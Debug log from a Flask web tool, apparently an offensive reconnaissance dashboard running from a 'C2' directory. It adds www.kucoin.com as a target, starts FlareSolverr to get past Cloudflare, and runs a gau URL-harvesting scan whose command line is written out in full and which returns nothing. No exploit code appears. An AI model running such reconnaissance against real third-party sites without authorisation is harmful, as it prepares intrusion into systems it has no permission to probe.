2025-06-05 23:49:31 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:49:31 | INFO     | Gau_route.py:100 | gau_scan() | 已删除旧的扫描结果: target_id=1
2025-06-05 23:49:31 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:49:31.362037')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:49:31 | WARNING  | Gau_route.py:116 | gau_scan() | 數據庫操作失敗 (嘗試 3/3): (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:49:31.362037')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:49:31 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:49:31.362037')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:49:31 | ERROR    | Gau_route.py:120 | gau_scan() | 创建扫描记录失败，已重試 3 次: (sqlite3.IntegrityError) UNIQUE constraint failed: gau_results.target_id
[SQL: INSERT INTO gau_results (target_id, domain, urls, total_urls, status, error_message, scan_time) VALUES (?, ?, ?, ?, ?, ?, ?)]
[parameters: (1, 'www.etsy.com', '[]', 0, 'scanning', None, '2025-06-05 23:49:31.362037')]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-05 23:49:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:31] "[35m[1mPOST /api/gau/scan/1 HTTP/1.1[0m" 503 -
2025-06-05 23:49:33 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 23:49:33 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-05 23:49:33 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 23:49:33 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-05 23:49:33 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 23:49:33 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-05 23:49:33 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 23:49:33 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-05 23:49:33 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-05 23:49:33 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 23:49:33 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-05 23:49:33 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-05 23:49:33 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-05 23:49:43 | INFO     | config.py:205 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 23:49:43 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-05 23:49:43 | INFO     | index_routes.py:17 | index() | 查詢到 0 個目標
2025-06-05 23:49:43 | INFO     | config.py:210 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.031s)
2025-06-05 23:49:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:43] "GET / HTTP/1.1" 200 -
2025-06-05 23:49:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:43] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:49:45 | INFO     | config.py:205 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 23:49:45 | INFO     | config.py:210 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.001s)
2025-06-05 23:49:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:45] "GET /add_target HTTP/1.1" 200 -
2025-06-05 23:49:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:45] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:49:51 | INFO     | config.py:205 | wrapper() | 📞 調用函數 add_target (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 23:49:51 | INFO     | index_routes.py:47 | add_target() | 收到添加目標請求: domain='www.kucoin.com', target_ip='https://www.kucoin.com/'
2025-06-05 23:49:51 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.kucoin.com/, domain=www.kucoin.com
2025-06-05 23:49:51 | INFO     | index_routes.py:69 | add_target() | 嘗試添加新目標: target_ip=https://www.kucoin.com/, domain=www.kucoin.com
2025-06-05 23:49:51 | INFO     | index_routes.py:83 | add_target() | ✅ 成功添加目標: ID=1, target_ip=https://www.kucoin.com/
2025-06-05 23:49:51 | INFO     | index_routes.py:83 | add_target() | ✅ 成功添加目標: ID=1, target_ip=https://www.kucoin.com/
2025-06-05 23:49:51 | INFO     | index_routes.py:84 | add_target() | 目標添加成功: ID=1
2025-06-05 23:49:51 | INFO     | config.py:210 | wrapper() | ✅ 函數 add_target 執行成功 (耗時: 0.006s)
2025-06-05 23:49:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:51] "[32mPOST /add_target HTTP/1.1[0m" 302 -
2025-06-05 23:49:51 | INFO     | config.py:205 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-05 23:49:51 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-05 23:49:51 | INFO     | index_routes.py:17 | index() | 查詢到 1 個目標
2025-06-05 23:49:51 | INFO     | config.py:210 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.001s)
2025-06-05 23:49:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:51] "GET / HTTP/1.1" 200 -
2025-06-05 23:49:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:51] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:49:52 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-05 23:49:52 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-05 23:49:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:52] "GET /attack/1 HTTP/1.1" 200 -
2025-06-05 23:49:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:52] "[36mGET /static/css/attack.css HTTP/1.1[0m" 304 -
2025-06-05 23:49:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:52] "[36mGET /static/js/dist/bundle.js HTTP/1.1[0m" 304 -
2025-06-05 23:49:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:52] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:49:54 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:49:54 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-05 23:49:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:54] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-05 23:49:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:54] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-05 23:49:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:54] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:49:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:54] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 23:49:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:54] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-05 23:49:55 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:49:55 | INFO     | Gau_route.py:73 | gau_scan() | Scan parameters: threads=50, providers=wayback,commoncrawl,otx,urlscan, exclude_extensions=[], blacklist=ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:49:55 | INFO     | Gau_route.py:111 | gau_scan() | 创建新的扫描记录: target_id=1, domain=www.kucoin.com
2025-06-05 23:49:55 | INFO     | Gau_route.py:111 | gau_scan() | 创建新的扫描记录: target_id=1, domain=www.kucoin.com
2025-06-05 23:49:55 | INFO     | Gau_route.py:154 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-05 23:49:55 | INFO     | Gau_route.py:154 | gau_scan() | Final scan options: {'threads': 50, 'providers': 'wayback,commoncrawl,otx,urlscan', 'blacklist': 'ttf,woff,svg,png,jpg,gif,jpeg,ico', 'verbose': False}
2025-06-05 23:49:55 | INFO     | thread_gau.py:499 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-05 23:49:55 | INFO     | thread_gau.py:499 | start_gau_scan() | 已启动Gau扫描，目标ID: 1
2025-06-05 23:49:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:55] "POST /api/gau/scan/1 HTTP/1.1" 200 -
2025-06-05 23:49:55 | INFO     | thread_gau.py:272 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.kucoin.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1749138595.txt --threads 50 --timeout 20 --retries 2 --from 202306 --providers wayback,commoncrawl,otx,urlscan --fp --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:49:55 | INFO     | thread_gau.py:272 | _execute_gau_scan() | 执行命令: /home/hacker/Desktop/C2/tools/gau_linux/gau www.kucoin.com --o /home/hacker/Desktop/C2/output/gau/gau_1_1749138595.txt --threads 50 --timeout 20 --retries 2 --from 202306 --providers wayback,commoncrawl,otx,urlscan --fp --blacklist ttf,woff,svg,png,jpg,gif,jpeg,ico
2025-06-05 23:49:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:49:58] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:01] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:04] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:07] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:11] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:14] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:17] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:20] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:23] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:26] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:32] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:35] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:38] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:41] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:44] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:47] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:50] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:53] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:56] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:50:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:50:59] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:02] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:05] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:08] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:11] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:26] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:29] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:32] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:35] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:38] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:41] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:44] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:47] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:50] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:53] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:56] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:51:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:51:59] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:52:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:52:02] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:52:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:52:05] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:52:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:52:08] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:52:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:52:11] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:52:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:52:14] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:52:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:52:17] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:52:17 | INFO     | thread_gau.py:308 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-05 23:52:17 | INFO     | thread_gau.py:308 | _execute_gau_scan() | Gau扫描完成，正在处理结果...
2025-06-05 23:52:17 | INFO     | thread_gau.py:320 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-05 23:52:17 | INFO     | thread_gau.py:320 | _execute_gau_scan() | 输出文件大小: 0 字节
2025-06-05 23:52:17 | INFO     | thread_gau.py:166 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-05 23:52:17 | INFO     | thread_gau.py:166 | _update_scan_result() | 已更新Gau扫描结果，目标ID: 1，当前URL总数: 0
2025-06-05 23:52:17 | INFO     | thread_gau.py:345 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-05 23:52:17 | INFO     | thread_gau.py:345 | _execute_gau_scan() | Gau扫描处理完成，目标ID: 1，总URL数: 0
2025-06-05 23:52:17 | INFO     | thread_gau.py:389 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1749138595.txt
2025-06-05 23:52:17 | INFO     | thread_gau.py:389 | _execute_gau_scan() | 已删除临时文件: /home/hacker/Desktop/C2/output/gau/gau_1_1749138595.txt
2025-06-05 23:52:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:52:20] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-05 23:52:20 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:52:20 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-05 23:52:20 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:52:20 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-05 23:52:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:52:20] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-05 23:52:20 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:52:20 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-05 23:52:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [05/Jun/2025 23:52:20] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-22 16:58:21 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-22 16:58:21 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-22 16:58:21 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-22 16:58:21 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-22 16:58:21 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-22 16:58:21 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-22 16:58:21 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-22 16:58:21 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-22 16:58:21 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-22 16:58:25 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-22 16:58:25 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-22 16:58:25 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-22 16:58:25 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-22 16:58:25 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-22 16:58:25 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-22 21:05:21 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-22 21:05:21 | INFO     | config.py:168 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-22 21:05:21 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-22 21:05:21 | DEBUG    | config.py:169 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-22 21:05:21 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-22 21:05:21 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-22 21:05:21 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-22 21:05:21 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-22 21:05:21 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-22 21:05:25 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-22 21:05:25 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-22 21:05:25 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-22 21:05:25 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-22 21:05:25 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-22 21:05:25 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-22 21:05:31 | INFO     | config.py:209 | wrapper() | 📞 調用函數 index (位置參數個數: 0, 關鍵字參數: [])
2025-06-22 21:05:31 | INFO     | index_routes.py:14 | index() | 用戶訪問首頁
2025-06-22 21:05:31 | INFO     | index_routes.py:17 | index() | 查詢到 1 個目標
2025-06-22 21:05:32 | INFO     | config.py:214 | wrapper() | ✅ 函數 index 執行成功 (耗時: 0.029s)
2025-06-22 21:05:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:32] "GET / HTTP/1.1" 200 -
2025-06-22 21:05:33 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-22 21:05:33 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-22 21:05:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:33] "GET /attack/1 HTTP/1.1" 200 -
2025-06-22 21:05:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:33] "[36mGET /static/css/attack.css HTTP/1.1[0m" 304 -
2025-06-22 21:05:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:33] "GET /static/js/dist/bundle.js HTTP/1.1" 200 -
2025-06-22 21:05:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:33] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-22 21:05:36 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-22 21:05:36 | INFO     | Gau_route.py:377 | gau_dashboard() | 正在載入 Gau 掃描器界面
2025-06-22 21:05:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:36] "GET /api/gau/dashboard?target_id=1 HTTP/1.1" 200 -
2025-06-22 21:05:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:36] "[36mGET /static/js/gau_dashboard.js HTTP/1.1[0m" 304 -
2025-06-22 21:05:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:37] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:05:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:37] "GET /api/gau/history/1 HTTP/1.1" 200 -
2025-06-22 21:05:37 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-22 21:05:37 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-22 21:05:37 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-22 21:05:37 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-22 21:05:37 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-22 21:05:37 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-22 21:05:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:37] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-22 21:05:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:38] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-22 21:05:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:42] "GET /api/gau/status/1 HTTP/1.1" 200 -
2025-06-22 21:05:42 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-22 21:05:42 | INFO     | Gau_route.py:188 | gau_get_result() | DEBUG: gau_get_result called with target_id=1
2025-06-22 21:05:42 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-22 21:05:42 | INFO     | Gau_route.py:202 | gau_get_result() | DEBUG: Query parameters - page=1, per_page=50, category=all
2025-06-22 21:05:42 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-22 21:05:42 | INFO     | Gau_route.py:207 | gau_get_result() | DEBUG: scan_result found: True
2025-06-22 21:05:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:42] "GET /api/gau/result/1?page=1&per_page=50&category=all&search= HTTP/1.1" 200 -
2025-06-22 21:05:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [22/Jun/2025 21:05:51] "[33mGET /api/gau/file/1 HTTP/1.1[0m" 404 -
2025-06-22 21:06:08 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
2025-06-22 21:06:08 | INFO     | attack_route.py:16 | attack() | 加载扫描界面，目标ID: 1
